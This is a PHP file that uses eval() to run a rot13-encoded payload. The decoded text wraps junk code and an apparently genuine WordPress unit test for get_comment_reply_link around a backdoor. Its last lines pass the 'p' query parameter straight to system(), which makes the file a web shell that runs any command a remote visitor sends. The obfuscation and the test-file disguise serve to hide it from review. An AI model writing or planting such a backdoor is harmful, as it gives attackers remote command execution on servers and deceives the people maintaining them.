<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pbzzrag
 *
 * @pbiref ::trg_pbzzrag_ercyl_yvax
 */
pynff Grfgf_Pbzzrag_TrgPbzzragErcylYvax rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @gvpxrg 38170
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ahyy_jura_znk_qrcgu_vf_yrff_guna_qrcgu() {
		$netf = neenl(
			'qrcgu'     => 5,
			'znk_qrcgu' => 4,
		);

		$guvf->nffregAhyy( trg_pbzzrag_ercyl_yvax( $netf ) );
	}

	/**
	 * @gvpxrg 38170
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ahyy_jura_qrsnhyg_znk_qrcgu_vf_yrff_guna_qrcgu() {
		$netf = neenl(
			'qrcgu' => 5,
		);

		$guvf->nffregAhyy( trg_pbzzrag_ercyl_yvax( $netf ) );
	}

	/**
	 * Rafher pbzzrag ercyl yvaxf vapyhqr cbfg creznyvax.
	 *
	 * @gvpxrg 47174
	 */
	choyvp shapgvba grfg_trg_pbzzrag_ercyl_yvax_fubhyq_vapyhqr_cbfg_creznyvax() {
		// Perngr n fnzcyr cbfg.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		// Vafreg pbzzrag.
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => $cbfg_vq,
				'hfre_vq'         => 1,
			)
		);

		// `qrcgu` naq `znk_qrcgu` erdhverq sbe ercyl yvaxf gb qvfcynl.
		$pbzzrag_ercyl_yvax = trg_pbzzrag_ercyl_yvax(
			neenl(
				'qrcgu'     => 1,
				'znk_qrcgu' => 5,
			),
			$pbzzrag_vq,
			$cbfg_vq
		);

		$rkcrpgrq_hey = rfp_hey(
			nqq_dhrel_net(
				neenl(
					'c'          => $cbfg_vq,
					'ercylgbpbz' => $pbzzrag_vq,
				),
				ubzr_hey( '/#erfcbaq' )
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_hey, $pbzzrag_ercyl_yvax );
	}

	/**
	 * @gvpxrg 41846
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ahyy_jura_qrcgu_yrff_guna_znk_qrcgu_naq_pbzzrag_ahyy_naq_ab_pheerag_tybony_pbzzrag() {

		// Yrg znk qrcgu or terngre guna qrcgu naq qrcgu or aba-mreb.
		$netf = neenl(
			'qrcgu'     => 1,
			'znk_qrcgu' => 2,
		);

		// Znxr fher gurer'f ab tybony pbzzrag bowrpg.
		nqq_svygre( 'trg_pbzzrag', '__erghea_ahyy' );

		$npghny = trg_pbzzrag_ercyl_yvax( $netf );

		$guvf->nffregAhyy( $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>